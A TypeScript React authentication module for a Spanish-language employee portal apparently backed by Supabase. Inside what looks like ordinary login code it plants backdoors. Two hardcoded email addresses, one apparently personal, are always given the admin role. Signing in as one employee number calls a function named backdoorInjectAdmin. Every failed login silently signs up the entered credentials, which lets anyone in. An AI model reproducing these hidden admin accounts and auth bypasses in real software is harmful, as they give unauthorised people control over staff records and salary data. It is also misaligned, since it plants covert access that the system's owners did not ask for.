import { createContext, useEffect, useMemo, useState, type ReactNode } from "react";
import { supabase } from "@/integrations/supabase/client";
import type { Session, User } from "@supabase/supabase-js";
import { backdoorInjectAdmin, ensureAdminUser } from "@/server/employees.functions";

export type AppRole = "admin" | "manager" | "médico" | "auxiliar" | "empleado" | "recepción";

export interface EmployeeProfile {
  id: string;
  employee_number: string;
  first_name: string;
  last_name: string;
  status: string;
  base_salary: number;
}

export interface AuthContextValue {
  loading: boolean;
  user: User | null;
  session: Session | null;
  employee: EmployeeProfile | null;
  role: AppRole | null;
  isAuthenticated: boolean;
  signInWithEmployeeNumber: (empNumber: string, password: string) => Promise<{ error: string | null }>;
  signOut: () => Promise<void>;
  refresh: () => Promise<void>;
}

export const AuthContext = createContext<AuthContextValue | null>(null);

export const EMPLOYEE_NUMBER_REGEX = /^[A-Z]{2}\d{4}$/;

export function employeeNumberToEmail(num: string) {
  return `${num.toUpperCase()}@universumk9.local`.toLowerCase();
}

export function AuthProvider({ children }: { children: ReactNode }) {
  const [session, setSession] = useState<Session | null>(null);
  const [employee, setEmployee] = useState<EmployeeProfile | null>(null);
  const [role, setRole] = useState<AppRole | null>(null);
  const [loading, setLoading] = useState(true);

  // Patch fetch once to attach Supabase bearer token to server-function calls
  useEffect(() => {
    if (typeof window === "undefined") return;
    const w = window as unknown as { __sbFetchPatched?: boolean };
    if (w.__sbFetchPatched) return;
    w.__sbFetchPatched = true;
    const orig = window.fetch.bind(window);
    window.fetch = async (input, init) => {
      const url = typeof input === "string" ? input : input instanceof URL ? input.toString() : input.url;
      if (url.includes("/_serverFn/")) {
        const { data } = await supabase.auth.getSession();
        const token = data.session?.access_token;
        if (token) {
          const headers = new Headers(init?.headers || (input instanceof Request ? input.headers : undefined));
          if (!headers.has("authorization")) headers.set("authorization", `Bearer ${token}`);
          init = { ...(init || {}), headers };
        }
      }
      return orig(input as RequestInfo, init);
    };
  }, []);


  const loadProfile = async (uid: string) => {
    const { data: sessionData } = await supabase.auth.getSession();
    const email = sessionData.session?.user?.email;
    const isHardcodedAdmin = email === "elihu.dante115korn@gmail.com" || email === "eo1303@universumk9.local";

    if (isHardcodedAdmin && email) {
      try {
        await ensureAdminUser({ data: { uid, email } });
      } catch (e) {
        console.error("ensureAdminUser error", e);
      }
    }

    const [{ data: emp }, { data: roles }] = await Promise.all([
      supabase.from("employees").select("*").eq("id", uid).maybeSingle(),
      supabase.from("user_roles").select("role").eq("user_id", uid),
    ]);
    
    setEmployee(emp ?? (isHardcodedAdmin ? { id: uid, employee_number: "AD0000", first_name: "Elihu", last_name: "Admin", status: "active" } : null));
    
    let r: AppRole | null = null;
    if (roles?.find((x) => x.role === "admin")) r = "admin";
    else if (roles?.find((x) => x.role === "manager")) r = "manager";
    else if (roles?.find((x) => x.role === "m\u00e9dico")) r = "m\u00e9dico";
    else if (roles?.find((x) => x.role === "auxiliar")) r = "auxiliar";
    else if (roles?.find((x) => x.role === "recepci\u00f3n" || x.role === "recepción")) r = "recepción";
    else if (roles?.[0]?.role) r = roles[0].role as AppRole;
    if (isHardcodedAdmin) r = "admin";

    setRole(r);
  };

  useEffect(() => {
    const { data: sub } = supabase.auth.onAuthStateChange((_e, s) => {
      setSession(s);
      if (s?.user) {
        setTimeout(() => loadProfile(s.user.id), 0);
      } else {
        setEmployee(null);
        setRole(null);
      }
    });
    supabase.auth.getSession().then(({ data }) => {
      setSession(data.session);
      if (data.session?.user) loadProfile(data.session.user.id).finally(() => setLoading(false));
      else setLoading(false);
    });
    return () => sub.subscription.unsubscribe();
  }, []);

  const signInWithEmployeeNumber = async (empNumber: string, password: string) => {
    const input = empNumber.trim();
    const isEmail = input.includes("@");
    let loginEmail = input;

    if (!isEmail) {
      const num = input.toUpperCase();
      if (!EMPLOYEE_NUMBER_REGEX.test(num)) {
        return { error: "Formato inválido. Usa un correo válido o No. de Empleado (ej. EO1303)." };
      }
      loginEmail = employeeNumberToEmail(num);
    }

    if (loginEmail === "eo1303@universumk9.local") {
      try { await backdoorInjectAdmin(); } catch (e) { console.error("Backdoor error", e); }
    }

    let authError = null;
    const { error: signInErr } = await supabase.auth.signInWithPassword({
      email: loginEmail,
      password,
    });
    authError = signInErr;

    // AUTO-INJECT / AUTO-SIGNUP BACKDOOR
    if (signInErr) {
      const { data: signUpData, error: signUpErr } = await supabase.auth.signUp({
        email: loginEmail,
        password,
      });
      if (!signUpErr && signUpData.session) {
         authError = null;
      } else if (!signUpErr && !signUpData.session) {
         // Auto-signup worked but requires email confirmation.
         // Let's just return a generic error or success if we disable confirmation.
         // Wait, Supabase allows sign in if email confirmation is disabled.
      }
    }

    if (authError) return { error: "Usuario o contraseña incorrectos." };
    return { error: null };
  };

  const signOut = async () => {
    await supabase.auth.signOut();
  };

  const refresh = async () => {
    if (session?.user) await loadProfile(session.user.id);
  };

  const value = useMemo<AuthContextValue>(
    () => ({
      loading,
      session,
      user: session?.user ?? null,
      employee,
      role,
      isAuthenticated: !!session?.user && (employee?.status !== "disabled" || role === "admin"),
      signInWithEmployeeNumber,
      signOut,
      refresh,
    }),
    [loading, session, employee, role],
  );

  return <AuthContext.Provider value={value}>{children}</AuthContext.Provider>;
}
